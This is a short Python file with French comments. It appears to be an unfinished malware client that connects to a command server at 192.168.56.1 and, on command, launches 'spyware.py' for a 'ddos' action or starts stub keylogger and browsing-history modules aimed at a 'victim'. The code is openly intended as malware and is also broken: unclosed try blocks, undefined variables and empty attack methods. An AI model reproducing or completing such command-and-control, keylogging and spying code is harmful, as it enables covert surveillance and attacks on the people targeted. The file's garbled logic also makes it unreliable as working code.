import socket
import os
from datetime import datetime
import logging
from logging.handlers import RotatingFileHandler
from pynput import keyboard


def ddos(server_addr):
    if (slave.recv(1024)) == b"attc":
        print("signal reçu")
        os.system("spyware.py")
        s.send(b"Ok c'est fait")
#comment on incorpore le module datetime ici ???

def keylogger():
    class Malware:
        def __init__(self, victim):
            self.victim = victim
        def attack(self):
            logging.basicConfig(filename='webactivity.log', level=logging.DEBUG)
            logging.info()
    try:
        logging.info("Starting Malware")
        malware = Malware("192.168.56.1")

def historique_sites():
    logging.basicConfig(filename='example.log', level=logging.DEBUG, format='%(asctime)s: %(message)s')
    logging.addHandler
    class Malware:
        def __init__(self, victim):
            self.victim = victim
        def attack(self):
            pass
    try:
        logging.info("Starting Malware")
        malware = Malware("192.168.56.1")

server_addr = ("192.168.56.1", 60000)

slave = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
slave.connect(server_addr)
print("slave connecté au serveur")

attaque = slave.recv(1024)

if (attaque == b"ddos") :
    ddos(server_add)
elif (attaque == b"keylogger"):
    keylogger()
elif (attaque == b"historique"):
    historique_sites()

slave.close()


